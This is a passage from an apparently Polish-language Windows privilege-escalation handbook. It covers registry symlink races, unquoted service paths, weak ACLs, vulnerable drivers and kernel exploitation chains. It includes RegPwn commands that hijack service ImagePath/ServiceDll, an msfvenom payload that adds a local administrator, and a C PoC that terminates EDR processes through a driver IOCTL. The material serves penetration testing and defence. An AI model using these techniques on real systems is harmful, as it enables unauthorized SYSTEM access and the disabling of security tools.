### Wyścig z dowiązaniem symbolicznym w rejestrze umożliwiający zapis dowolnej wartości HKLM (ATConfig)

Niektóre funkcje ułatwień dostępu systemu Windows tworzą klucze **ATConfig** dla poszczególnych użytkowników, które są później kopiowane przez proces **SYSTEM** do klucza sesji HKLM. **Race condition z dowiązaniem symbolicznym** w rejestrze może przekierować ten zapis z podwyższonymi uprawnieniami do **dowolnej ścieżki HKLM**, zapewniając możliwość zapisu dowolnej **wartości** HKLM.<sup>[[18]](#references)</sup>

Lokalizacje kluczy (przykład: Klawiatura ekranowa `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` zawiera listę zainstalowanych funkcji ułatwień dostępu.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` przechowuje konfigurację kontrolowaną przez użytkownika.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` jest tworzony podczas logowania/przejść na bezpieczny pulpit i można go modyfikować jako użytkownik.

Przebieg ataku (CVE-2026-24291 / ATConfig):

1. Ustaw wartość **HKCU ATConfig**, którą SYSTEM ma zapisać.
2. Wywołaj kopiowanie na bezpiecznym pulpicie (np. **LockWorkstation**), co uruchamia przepływ AT broker.
3. **Wygraj race**, zakładając **oplock** na `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; gdy oplock zostanie wyzwolony, zastąp klucz **HKLM Session ATConfig** **dowiązaniem rejestru** prowadzącym do chronionego obiektu HKLM.
4. SYSTEM zapisuje wybraną przez atakującego wartość w przekierowanej ścieżce HKLM.

Po uzyskaniu możliwości zapisu dowolnej wartości HKLM przejdź do LPE, nadpisując wartości konfiguracji usługi:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/wiersz poleceń)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Wybierz usługę, którą może uruchomić zwykły użytkownik (np. **`msiserver`**), i uruchom ją po zapisie. **Uwaga:** publiczna implementacja exploita **blokuje stację roboczą** w ramach race.

Przykładowe narzędzia (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Uprawnienia AppendData/AddSubdirectory w rejestrze usług

Jeśli masz takie uprawnienie do rejestru, oznacza to, że **możesz tworzyć podklucze w jego obrębie**. W przypadku usług Windows **wystarczy to, aby wykonać dowolny kod:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Jeśli ścieżka do pliku wykonywalnego nie jest ujęta w cudzysłowy, Windows spróbuje uruchomić każdy ciąg kończący się przed spacją.

Na przykład dla ścieżki _C:\Program Files\Some Folder\Service.exe_ Windows spróbuje uruchomić:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Wyświetl wszystkie nieujęte w cudzysłowy ścieżki usług, z wyłączeniem tych należących do wbudowanych usług systemu Windows:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Możesz wykryć i wykorzystać** tę podatność za pomocą Metasploit: `exploit/windows/local/trusted\_service\_path` Możesz ręcznie utworzyć plik binarny usługi za pomocą Metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Działania naprawcze

Windows pozwala użytkownikom określić działania wykonywane w przypadku awarii usługi. Tę funkcję można skonfigurować tak, aby wskazywała plik binarny. Jeśli można go podmienić, eskalacja uprawnień może być możliwa. Więcej informacji można znaleźć w [oficjalnej dokumentacji](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Skrypty wskazane w zadaniach zaplanowanych

W przypadku włączonego zadania, które uruchamia `cmd.exe /c` z plikiem `.bat` lub `.cmd`, sprawdź skrypt wskazany w **argumentach akcji**, a także `cmd.exe`. To samo dotyczy jawnego argumentu plikowego interpretera, takiego jak `-File` w PowerShell. Jeśli zaplanowany plik wsadowy zawiera bezpośrednie wywołanie PowerShell z `-File`, sprawdź również ACL wskazanego skryptu; zmienne, instrukcje warunkowe i łączenie poleceń w powłoce wymagają ręcznego prześledzenia. Zapis do skryptu lub jego katalogu przez wywołującego wskazuje na możliwość wykonania kodu w kontekście innego konta tylko wtedy, gdy skonfigurowane konto zadania różni się od konta wywołującego, a zadanie rzeczywiście wykonuje tę akcję. ACL umożliwiający dopisywanie może mieć znaczenie w przypadku skryptów, ale wcześniejsze `exit` lub inny przepływ sterowania może sprawić, że dopisane wiersze nie zostaną wykonane. Przed stwierdzeniem, że możliwa jest eskalacja, potwierdź efektywne ACL, [kontekst wykonywania zadania](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), katalog roboczy, wyzwalacz i zasady kontroli aplikacji. Inwentaryzacja nie powinna modyfikować skryptu ani uruchamiać zadania.

## Strumienie nazwane w dostępnych plikach

W systemie plików NTFS plik z prawem do odczytu może zawierać nazwany strumień `:$DATA`, którego zawartość nie jest widoczna na zwykłej liście katalogu. W przypadku niewielkiego, istotnego zbioru dostępnych kopii zapasowych lub plików konfiguracyjnych przed otwarciem zawartości sprawdź **nazwy i rozmiary** strumieni; Windows udostępnia je przez [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) oraz PowerShell [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Nazwa strumienia sugerująca obecność sekretu to jedynie wskazówka. Sprawdź efektywne uprawnienia do odczytu pliku, obsługę strumieni przez system plików, to, czy strumień zawiera użyteczne dane uwierzytelniające, oraz to, do jakiego konta faktycznie się one uwierzytelniają. Podczas rutynowej inwentaryzacji unikaj rekurencyjnego skanowania strumieni i wyświetlania ich zawartości.

## Pliki wejściowe pomocnika Windows Driver Kit uruchamianego przez harmonogram

Opcjonalny Windows Driver Kit zawiera `StandaloneRunner.exe`, który może odczytywać pliki `command.txt`, `reboot.rsf` oraz plik projektu `working\rsf.rsf` z katalogu uruchomieniowego. Zaplanowane zadanie lub usługa uruchamiająca ten pomocnik na koncie z podwyższonymi uprawnieniami może wykorzystać możliwość zapisu do tych plików przez użytkownika o niskich uprawnieniach do wykonania poleceń w kontekście tego konta, nawet jeśli sam plik wykonywalny pomocnika jest chroniony. Potwierdź, że istnieje proces odczytujący te pliki z podwyższonymi uprawnieniami, oraz że można utworzyć lub zmodyfikować **oba** pliki towarzyszące; samo znalezienie pomocnika nie wystarcza.

W przypadku zaplanowanego zadania sprawdź [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) jego akcji oraz ACL obu ścieżek do plików towarzyszących. Jeśli zadanie nie określa katalogu roboczego, katalog pliku wykonywalnego jest jedynie wskazówką do zweryfikowania, a nie dowodem na to, skąd zadanie odczytuje pliki wejściowe. Musi być również spełniony warunek dotyczący pliku projektu. Sprawdź rzeczywiste konto zadania, zamiast zakładać, że jest to SYSTEM.

## Aplikacje

### Zainstalowane aplikacje

Sprawdź **uprawnienia do plików binarnych** (być może możesz podmienić jeden z nich i eskalować uprawnienia) oraz **katalogów** ([DLL Hijacking](dll-hijacking/index.html).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Ścieżka naprawy agenta Checkmk w systemie Windows

[CVE-2024-0670](https://checkmk.com/werk/16361) dotyczy starszych agentów Checkmk dla systemu Windows, które zapisywały pliki poleceń w `C:\Windows\Temp`, a następnie — gdy zastąpienie pliku się nie powiodło — wykonywały istniejący plik chroniony przed zapisem. Dostawca naprawił problem w wersjach 2.1.0p40, 2.2.0p23, 2.3.0b1 i 2.4.0b1. Sprawdź pełny poziom poprawek zainstalowanej wersji oraz to, czy może zostać uruchomiona podatna operacja agenta; sama etykieta gałęzi, taka jak `2.1`, nie wystarcza do ustalenia, czy system jest podatny. Podczas enumeracji można sprawdzić wersję, stan usługi i uprawnienia do Temp, nie tworząc plików ani nie wywołując poleceń agenta.

#### Przegląd usługi SAML ADSelfService Plus

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) dotyczy ADSelfService Plus w kompilacji 6210 i wcześniejszych; dostawca naprawił problem w kompilacji 6211. Ma znaczenie tylko wtedy, gdy SAML SSO **jest lub było** włączone. Wpis o zainstalowanym produkcie lub ścieżka usługi to zatem wskazówka, a nie werdykt o podatności: potwierdź dokładną kompilację, historię konfiguracji SAML, dostępność usługi z sieci oraz konto, na którym działa. Wykonanie kodu przez usługę odbywa się z uprawnieniami tego konta; uruchomienie jako SYSTEM wymaga instancji działającej jako SYSTEM. Odczytywalny plik `OfflineBackup_*.ezip` w katalogu Backup produktu to odrębna wskazówka dotycząca zaszyfrowanej kopii zapasowej, a nie dowód na dostępne poświadczenie ani na tę lukę SAML. Podczas rutynowej enumeracji zanotuj jego ścieżkę i prawa dostępu, ale go nie rozpakowuj.

#### Granice uprawnień kontrolera Jenkins i kont domenowych

Na kontrolerze Jenkins działającym w systemie Windows rozróżnij uprawnienie do tworzenia lub konfigurowania zadania od uprawnienia do jego uruchamiania: [Jenkins dokumentuje je jako oddzielne uprawnienia `Job/Create`, `Job/Configure` i `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Skonfigurowany harmonogram lub zdalny wyzwalacz mogą zapewniać inną drogę uruchomienia kompilacji, ale potwierdź, że jest ona włączona i kompilacja faktycznie się uruchamia. Kod wykonuje się z tożsamością kontrolera lub wybranego agenta, a zapisane poświadczenie jest użyteczne tylko wtedy, gdy zadanie ma dostęp do jego zakresu. Osobno sprawdź dostęp do metadanych `JENKINS_HOME`: Jenkins przechowuje dane poświadczeń i klucze szyfrowania w plikach `credentials.xml`, `secrets/hudson.util.Secret` i `secrets/master.key` ([przechowywanie sekretów w Jenkins](https://www.jenkins.io/doc/developer/security/secrets/)). Sama ich obecność nie ujawnia hasła; zweryfikuj **prawo odczytu wymaganych plików** oraz odrębną ścieżkę ponownego użycia konta, nie wypisując sekretów we współdzielonym wyjściu. Jeśli to konto ma prawo zapisu do atrybutu `scriptPath` obiektu użytkownika AD, potwierdź zapisywalną ścieżkę skryptu oraz rzeczywisty proces logowania lub harmonogram, który uruchamia skrypt jako użytkownik docelowy, zanim uznasz to za wykonanie kodu jako inny użytkownik. Dalsza kontrola grup wymaga osobnej weryfikacji efektywnych uprawnień AD.

#### Tożsamość agenta self-hosted Azure Pipelines

W przypadku projektu Azure DevOps Server lub Azure Pipelines rozróżnij uprawnienie do **tworzenia lub edytowania** pipeline’u od uprawnienia do **umieszczenia go w kolejce** i korzystania z wybranej puli agentów; [Microsoft osobno opisuje uprawnienia pipeline’ów](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) oraz [autoryzację puli](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops). Jeśli konto o niższych uprawnieniach może przesłać krok skryptu i uruchomić ten pipeline na self-hosted agencie Windows, krok zostanie wykonany jako [skonfigurowane konto systemu operacyjnego agenta](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Przed stwierdzeniem, że następuje przejście na konto innego użytkownika lub SYSTEM, zweryfikuj konkretny pipeline, ograniczenia dotyczące gałęzi i zasobów, autoryzowaną pulę, zadanie możliwe do uruchomienia oraz tożsamość usługi agenta. Zainstalowany agent, rola w projekcie lub samo prawo zapisu do repozytorium to tylko wskazówki; podczas pasywnej enumeracji sprawdź uprawnienia i lokalne metadane usługi, nie uruchamiając kompilacji.

#### Poświadczenia Microsoft Entra Connect Sync

[Microsoft rozróżnia](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) **konto usługi ADSync**, na którym działa usługa synchronizacji i które uzyskuje dostęp do jej bazy danych SQL, od **konta łącznika AD DS**, którego uprawnienia katalogowe zależą od skonfigurowanych funkcji synchronizacji. Poświadczenia łącznika są przechowywane w tej bazie danych w postaci zaszyfrowanej, a materiał klucza jest [chroniony przez DPAPI w kontekście konta usługi ADSync](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Sama obecność zainstalowanej usługi synchronizacji, grupy sugerującej uprawnienia lokalnego administratora lub widoczność bazy danych nie potwierdza, że poświadczenie można odszyfrować ani że możliwa jest eskalacja uprawnień w domenie. Osobno sprawdź faktyczne prawa odczytu bazy danych, dostęp konta usługi do klucza, układ instalacji i SQL, skonfigurowaną tożsamość łącznika oraz efektywne uprawnienia tej tożsamości w AD. Rutynowa enumeracja powinna wyświetlać wyłącznie metadane usługi i dostępu, a nie odpytywać ani wypisywać zapisanych sekretów.

#### Uprawnienia do bibliotek DLL obsługujących sterownik drukarki

Zainstalowany sterownik drukarki może przechowywać biblioteki DLL obsługi w `C:\ProgramData` i ładować je w bardziej uprzywilejowanym procesie drukowania. Sprawdź dokładny katalog sterownika i ACL bibliotek DLL, w tym katalogów nadrzędnych i punktów ponownej analizy, nawet jeśli enumeracja drukarek WMI jest zablokowana. W przypadku problemu ze sterownikiem drukarki Ricoh [CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) zgłoszona ścieżka to `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [pierwotny opis](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) opisuje ładowanie bibliotek DLL przez `PrintIsolationHost.exe`. Zapisywalny ACL to tylko wskazówka: zweryfikuj efektywne prawo zapisu po uwzględnieniu wpisów odmowy, sprawdź, czy odpowiedni sterownik jest zainstalowany i ładuje plik z uprzywilejowaną tożsamością, a także czy zaktualizowany sterownik lub program zabezpieczający dostawcy naprawił instalację. Nie wnioskuj o podatności wyłącznie na podstawie nazwy katalogu lub wersji sterownika.

### Uprawnienia do zapisu

Sprawdź, czy możesz zmodyfikować jakiś plik konfiguracyjny, aby odczytać określony plik, albo czy możesz zmodyfikować plik binarny uruchamiany przez konto Administratora (schedtasks).

Słabe uprawnienia do folderów i plików w systemie można znaleźć w następujący sposób:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Trwałość/wykonywanie przez automatyczne ładowanie wtyczek Notepad++

Notepad++ automatycznie ładuje wszystkie biblioteki DLL wtyczek z podfolderów `plugins`. Jeśli dostępna jest zapisywalna instalacja przenośna/kopia, umieszczenie złośliwej wtyczki zapewnia automatyczne wykonanie kodu w `notepad++.exe` przy każdym uruchomieniu (w tym z poziomu `DllMain` i funkcji zwrotnych wtyczki).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Uruchamianie przy starcie

**Sprawdź, czy możesz nadpisać jakiś wpis rejestru lub plik binarny, który zostanie uruchomiony przez innego użytkownika.**\
**Przeczytaj** **poniższą stronę**, aby dowiedzieć się więcej o interesujących **lokalizacjach autostartu umożliwiających eskalację uprawnień**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Sterowniki

Szukaj potencjalnie **nietypowych/podatnych sterowników firm zewnętrznych**.

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Jeśli sterownik udostępnia prymitywne operacje odczytu/zapisu w dowolnym miejscu pamięci jądra (częste w źle zaprojektowanych handlerach IOCTL), możesz eskalować uprawnienia, bezpośrednio kradnąc token SYSTEM z pamięci jądra.<sup>[[13]](#references)</sup> Instrukcję krok po kroku znajdziesz tutaj:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

Powiązane materiały dotyczące Windows kernel-exploitation:

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

W przypadku błędów race condition, w których podatne wywołanie otwiera ścieżkę Object Manager kontrolowaną przez atakującego, celowe spowolnienie wyszukiwania (za pomocą komponentów o maksymalnej długości lub głębokich łańcuchów katalogów) może wydłużyć okno z mikrosekund do dziesiątek mikrosekund:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

#### UAF w kolejkach cancel-safe, ujawnienia paged-pool i pivots I/O ring

Niektóre łańcuchy Windows kernel LPE można zbudować z dwóch niezbyt groźnych błędów: **race condition w cyklu życia kolejki cancel-safe**, która zwalnia żądanie/CBD, gdy blokada kolejki jest nadal utrzymywana, oraz ujawnienia **lock-release-before-copy**, które wycieka zwolnioną alokację paged-pool podczas `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Notatki dotyczące audytu i exploitacji:

- **Free-under-lock + późniejsze anulowanie**: szukaj ścieżki sukcesu, która wykonuje **Acquire -> CompleteRequest/free -> Release**, podczas gdy ścieżka anulowania wykonuje **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Jeśli ścieżka sukcesu dochodzi do `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` przed zwolnieniem blokady CBDQ/CSQ, wątek zablokowany w `NtCancelIoFileEx -> IopCsqCancelRoutine` może później wznowić działanie i przekazać zwolniony `PFLT_CALLBACK_DATA` do callbacku usuwania sterownika.
- **Odzyskaj zwolniony obiekt kolejki** za pomocą alokacji paged-pool o tym samym rozmiarze, kontrolowanej przez atakującego. Wpisy Data Queue Entries z `NPFS` są przydatne, ponieważ ich zawartość i rozmiar można kontrolować, a później sondować za pomocą operacji odczytu/podglądu pipe. Jeśli zwolniony obiekt zawiera wskaźniki listy, nadpisz je **cykliczną listą fałszywych węzłów żądań w pamięci użytkownika**, aby sterownik wielokrotnie przetwarzał struktury żądań zdefiniowane przez atakującego, zamiast kończyć przetwarzanie na pierwotnej głowie listy.
- **Rozwiń przewidywalny zapis**: jeśli fałszywe żądanie przekieruje zagnieżdżony wskaźnik kontekstu używany przez zapisy księgowe (znaczniki czasu / QPC / pola sąsiadujące z licznikiem referencji), możesz uzyskać zapis do wskazanego adresu, ale bez kontroli nad zapisywaną wartością. W takim przypadku zaatakuj pole **length/size** obiektu ze sprayowanego poola, zamiast końcowego wskaźnika kodu/danych, a następnie przeszukuj spray, aż uszkodzony obiekt umożliwi odczyt poza zakresem z paged-pool.
- **Wzorzec podatnego na race condition ujawnienia**: każde wywołanie systemowe wykonujące `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` jest dobrym kandydatem. Niezawodność wzrasta, gdy atakujący może powiększyć kopiowany bufor (na przykład przez dodanie wielu wpisów listy/zasobów, które zwiększają końcowy rozmiar alokacji serializatora), ponieważ dłuższe kopiowanie wydłuża okno na podmianę bez konieczności zawieszenia systemu.
- **Cele ponownego wypełnienia bogate we wskaźniki**: tablice zarejestrowanych buforów Windows **I/O ring** są doskonałymi celami ujawnienia, ponieważ ich rozmiar w paged-pool można kontrolować (`8 * regBufferCnt`), a każdy element jest wskaźnikiem jądra do `_IOP_MC_BUFFER_ENTRY`. Wyciek jednej z tych tablic pozwala odzyskać otaczający ją `IORING_OBJECT`, a następnie uszkodzić **`RegBuffers`** i **`RegBuffersCount`**, by kolejne operacje I/O ring używały sfałszowanych wpisów i zapewniały dowolny odczyt/zapis w jądrze. Jeśli jedyny dostępny zapis daje stabilny bajt (na przykład z `KUSER_SHARED_DATA+0x14`), użyj **nakładających się, niewyrównanych zapisów**, aby utworzyć wskaźnik użytkownika z powtarzającym się bajtem, taki jak `0x0101010101010101`, zmapuj go za pomocą `VirtualAlloc` i umieść tam sfałszowaną tablicę zarejestrowanych buforów.<sup>[[30]](#references)</sup>

Przydatne wskaźniki podczas debugowania:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Po uzyskaniu dowolnego odczytu/zapisu w kernelu dzięki uszkodzonemu I/O ringowi przejmij token SYSTEM, korzystając ze standardowego workflow po uzyskaniu prymitywu:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Prymitywy korupcji pamięci hive rejestru

Współczesne luki w hive rejestru pozwalają przygotowywać deterministyczne układy pamięci, wykorzystywać zapisywalne podklucze HKLM/HKU i przekształcać uszkodzenie metadanych w przepełnienia kernel paged pool bez niestandardowego drivera. Poznaj cały łańcuch tutaj:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Pomyłka typów w trybie direct funkcji `RtlQueryRegistryValues` przy ścieżkach kontrolowanych przez atakującego

Niektóre drivery przyjmują ścieżkę rejestru z userlandu, sprawdzają jedynie, czy jest poprawnym ciągiem UTF-16, a następnie wywołują `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` z `RTL_QUERY_REGISTRY_DIRECT`, przekazując wskaźnik do skalarnej zmiennej na stosie, takiej jak `int readValue`. Jeśli brakuje `RTL_QUERY_REGISTRY_TYPECHECK`, `EntryContext` jest interpretowany zgodnie z **rzeczywistym** typem wpisu rejestru, a nie typem oczekiwanym przez programistę.

Daje to dwa przydatne prymitywy:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: kontrolowana przez użytkownika ścieżka bezwzględna `\Registry\...` pozwala driverowi odpytywać wybrane przez atakującego klucze, ujawniać ich istnienie za pomocą kodów zwrotnych/logów, a czasem odczytywać wartości, do których wywołujący nie miałby bezpośredniego dostępu.
- **Korupcja pamięci jądra**: miejsce docelowe będące skalarem, takie jak `&readValue`, jest interpretowane jako inny typ — `REG_QWORD`, `UNICODE_STRING` albo bufor binarny o określonym rozmiarze — zależnie od typu wartości rejestru.

Praktyczne uwagi dotyczące exploita:

- **Zabezpieczenie w Windows 8 i nowszych**: jeśli zapytanie trafia do **niezaufanego hive** i używa `RTL_QUERY_REGISTRY_DIRECT` bez `RTL_QUERY_REGISTRY_TYPECHECK`, wywołania z jądra powodują awarię `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Aby zachować możliwość wykorzystania luki, szukaj **kluczy zapisywalnych w zaufanych hive systemu** zamiast umieszczać wartości w `HKCU`.
- **Umieszczanie danych w zaufanym hive**: użyj NtObjectManager do wyliczenia zapisywalnych podkluczy `\Registry\Machine`, a następnie ponów skanowanie z zduplikowanym tokenem o **niskim poziomie integralności**, aby znaleźć klucze dostępne z kontekstów sandboxowanych:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: bezpośredni zapis 8 bajtów do 4-bajtowego `int` uszkadza sąsiednie dane na stosie i może częściowo nadpisać pobliski wskaźnik callbacka/funkcji.
- **`REG_SZ` / `REG_EXPAND_SZ`**: tryb bezpośredni oczekuje, że `EntryContext` będzie wskazywać na `UNICODE_STRING`. Jeśli kod najpierw wczytuje kontrolowane przez atakującego `REG_DWORD` do skalarnej zmiennej na stosie, a następnie ponownie używa tego samego bufora do odczytu ciągu znaków, atakujący kontroluje `Length`/`MaximumLength` i częściowo wpływa na wskaźnik `Buffer`, co daje częściowo kontrolowany zapis do jądra.
- **`REG_BINARY`**: w przypadku dużych danych binarnych tryb bezpośredni traktuje pierwsze `LONG` pod adresem `EntryContext` jako rozmiar bufora ze znakiem. Jeśli wcześniejszy odczyt `REG_DWORD` pozostawi w ponownie użytym skalarze kontrolowaną przez atakującego **ujemną** wartość, następne zapytanie `REG_BINARY` kopiuje bajty atakującego bezpośrednio do sąsiednich slotów na stosie. To często najprostsza droga do pełnego nadpisania wskaźnika callbacka.

Skuteczny wzorzec wyszukiwania: **niejednorodne odczyty rejestru do tej samej zmiennej na stosie bez jej ponownej inicjalizacji**. Szukaj `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, ponownie używanych wskaźników `EntryContext` oraz ścieżek kodu, w których pierwszy odczyt rejestru decyduje o tym, czy nastąpi drugi odczyt.

#### Nadużywanie braku FILE_DEVICE_SECURE_OPEN w obiektach urządzeń (LPE + unieruchomienie EDR)

Niektóre podpisane sterowniki firm trzecich tworzą obiekt urządzenia z silnym SDDL za pomocą IoCreateDeviceSecure, ale zapominają ustawić FILE_DEVICE_SECURE_OPEN w DeviceCharacteristics. Bez tej flagi bezpieczna lista DACL nie jest egzekwowana, gdy urządzenie jest otwierane przez ścieżkę zawierającą dodatkowy komponent. Dzięki temu każdy nieuprzywilejowany użytkownik może uzyskać uchwyt, używając ścieżki przestrzeni nazw, takiej jak:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (z rzeczywistego przypadku)

Gdy użytkownik może otworzyć urządzenie, nadużycie uprzywilejowanych IOCTL udostępnianych przez sterownik może umożliwić LPE i manipulację. Przykładowe możliwości zaobserwowane w praktyce:
- Zwracanie uchwytów z pełnym dostępem do dowolnych procesów (kradzież tokena / powłoka SYSTEM za pomocą DuplicateTokenEx/CreateProcessAsUser).
- Nieograniczony surowy odczyt/zapis dysku (manipulacja offline, sztuczki z utrwalaniem obecności przy rozruchu).
- Kończenie dowolnych procesów, w tym Protected Process/Light (PP/PPL), co umożliwia unieruchomienie AV/EDR z poziomu user land za pośrednictwem jądra.

Minimalny wzorzec PoC (tryb użytkownika):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Środki zaradcze dla deweloperów
- Zawsze ustawiaj FILE_DEVICE_SECURE_OPEN podczas tworzenia obiektów urządzeń, które mają być ograniczone przez DACL.
- Weryfikuj kontekst wywołującego przy operacjach uprzywilejowanych. Dodaj kontrole PP/PPL przed zezwoleniem na zakończenie procesu lub zwrócenie uchwytów.
- Ogranicz IOCTLs (access masks, METHOD_*, walidacja danych wejściowych) i rozważ modele brokerowane zamiast bezpośrednich uprawnień jądra.

Pomysły na wykrywanie dla obrońców
- Monitoruj otwieranie podejrzanych nazw urządzeń z poziomu user-mode (np. \\ .\\amsdk*) oraz konkretne sekwencje IOCTL wskazujące na nadużycie.
- Wymuszaj stosowanie listy zablokowanych podatnych sterowników Microsoftu (HVCI/WDAC/Smart App Control) i utrzymuj własne listy dozwolonych i zablokowanych.


## PATH DLL Hijacking

Jeśli masz **uprawnienia do zapisu w folderze znajdującym się w PATH**, możesz przejąć kontrolę nad DLL ładowanym przez proces i **eskalować uprawnienia**.<sup>[[2]](#references)</sup>

Sprawdź uprawnienia do wszystkich folderów znajdujących się w PATH:

```bash
